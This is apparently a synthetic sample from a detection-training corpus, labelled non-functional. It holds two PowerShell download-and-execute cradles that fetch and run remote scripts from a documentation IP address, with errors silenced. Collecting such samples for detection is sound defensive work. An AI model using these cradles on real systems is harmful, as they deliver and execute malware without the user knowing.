# Synthetic sample - generated-content detection corpus (NON-FUNCTIONAL, doc IPs)
# Family: PowerShell download-and-execute cradle
$ErrorActionPreference = "SilentlyContinue"
IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage2.ps1')
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://192.0.2.10/b.txt")
